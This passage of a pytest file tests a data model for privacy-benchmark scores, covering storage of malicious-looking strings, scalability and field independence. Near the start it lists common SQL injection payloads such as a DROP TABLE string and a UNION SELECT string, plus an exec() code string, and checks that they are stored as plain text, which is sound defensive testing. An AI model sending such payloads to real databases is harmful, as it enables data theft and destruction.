    def test_no_code_injection_in_score_fields(self, valid_privacy_data):
        """Test that score fields with malicious strings are treated as strings"""
        valid_privacy_data["overall"] = "exec('malicious code')"
        
        privacy = Privacy(**valid_privacy_data)
        
        # Should just store as string, not execute
        assert privacy.overall == "exec('malicious code')"
        assert isinstance(privacy.overall, str)
    
    def test_sql_injection_patterns(self, valid_privacy_data):
        """Test various SQL injection patterns"""
        sql_patterns = [
            "1' OR '1'='1",
            "'; DROP TABLE users; --",
            "admin'--",
            "' UNION SELECT * FROM users--",
        ]
        
        for pattern in sql_patterns:
            valid_privacy_data["model_name"] = pattern
            privacy = Privacy(**valid_privacy_data)
            assert privacy.model_name == pattern


# ==================== SCALABILITY TESTS ====================

class TestPrivacyScalability:
    """Test scalability aspects"""
    
    def test_handle_multiple_instances(self, valid_privacy_data):
        """Test creating multiple Privacy instances"""
        instances = []
        
        for i in range(100):
            data = valid_privacy_data.copy()
            data["model_name"] = f"model-{i}"
            data["overall"] = f"0.{i:02d}"
            instances.append(Privacy(**data))
        
        assert len(instances) == 100
        assert instances[0].model_name == "model-0"
        assert instances[99].model_name == "model-99"
    
    def test_memory_efficiency_with_many_instances(self, valid_privacy_data):
        """Test memory efficiency with many instances"""
        instances = []
        
        for i in range(1000):
            data = valid_privacy_data.copy()
            data["model_name"] = f"model-{i}"
            instances.append(Privacy(**data))
        
        # All instances should be created successfully
        assert len(instances) == 1000
    
    def test_large_batch_serialization(self, valid_privacy_data):
        """Test serializing many instances"""
        instances = [Privacy(**valid_privacy_data) for _ in range(100)]
        
        serialized = [inst.model_dump() for inst in instances]
        
        assert len(serialized) == 100
        assert all(isinstance(item, dict) for item in serialized)


# ==================== FIELD-SPECIFIC TESTS ====================

class TestPrivacyFieldSpecific:
    """Test specific behaviors of individual fields"""
    
    def test_privacy_awareness_fields_relationship(self, valid_privacy_data):
        """Test relationship between privacy awareness fields"""
        valid_privacy_data["privacy_awareness_normal"] = "0.8"
        valid_privacy_data["privacy_awareness_aug"] = "0.85"
        valid_privacy_data["privacy_awareness_correlation"] = "0.82"
        
        privacy = Privacy(**valid_privacy_data)
        
        # All privacy awareness fields should be present and independent
        assert privacy.privacy_awareness_normal == "0.8"
        assert privacy.privacy_awareness_aug == "0.85"
        assert privacy.privacy_awareness_correlation == "0.82"
    
    def test_privacy_leakage_fields_independence(self, valid_privacy_data):
        """Test that privacy leakage fields are independent"""
        valid_privacy_data["privacy_leakage_rta"] = "0.9"
        valid_privacy_data["privacy_leakage_td"] = "0.92"
        valid_privacy_data["privacy_leakage_cd"] = "0.95"
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.privacy_leakage_rta == "0.9"
        assert privacy.privacy_leakage_td == "0.92"
        assert privacy.privacy_leakage_cd == "0.95"
    
    def test_overall_vs_individual_scores(self, valid_privacy_data):
        """Test that overall score can differ from individual scores"""
        valid_privacy_data["privacy_awareness_normal"] = "0.5"
        valid_privacy_data["privacy_leakage_td"] = "0.8"
        valid_privacy_data["overall"] = "0.65"  # Aggregate
        
        privacy = Privacy(**valid_privacy_data)
        
        # Overall can be different from individual scores
        assert privacy.overall == "0.65"
        assert privacy.privacy_awareness_normal == "0.5"
    
    def test_inhouse_model_flag_independence(self, valid_privacy_data):
        """Test that inhouse_model flag doesn't affect score fields"""
        valid_privacy_data["inhouse_model"] = True
        privacy1 = Privacy(**valid_privacy_data)
        
        valid_privacy_data["inhouse_model"] = False
        privacy2 = Privacy(**valid_privacy_data)
        
        # Score fields should be same regardless of inhouse_model
        assert privacy1.overall == privacy2.overall
        assert privacy1.privacy_awareness_normal == privacy2.privacy_awareness_normal
        # But inhouse_model should differ
        assert privacy1.inhouse_model != privacy2.inhouse_model
    
    def test_aug_vs_normal_privacy_awareness(self, valid_privacy_data):
        """Test that augmented privacy awareness can differ from normal"""
        valid_privacy_data["privacy_awareness_normal"] = "0.7"
        valid_privacy_data["privacy_awareness_aug"] = "0.9"
        
        privacy = Privacy(**valid_privacy_data)
        
        assert privacy.privacy_awareness_normal != privacy.privacy_awareness_aug
        assert privacy.privacy_awareness_normal == "0.7"
        assert privacy.privacy_awareness_aug == "0.9"


if __name__ == '__main__':
    pytest.main([__file__, '-v', '--tb=short'])
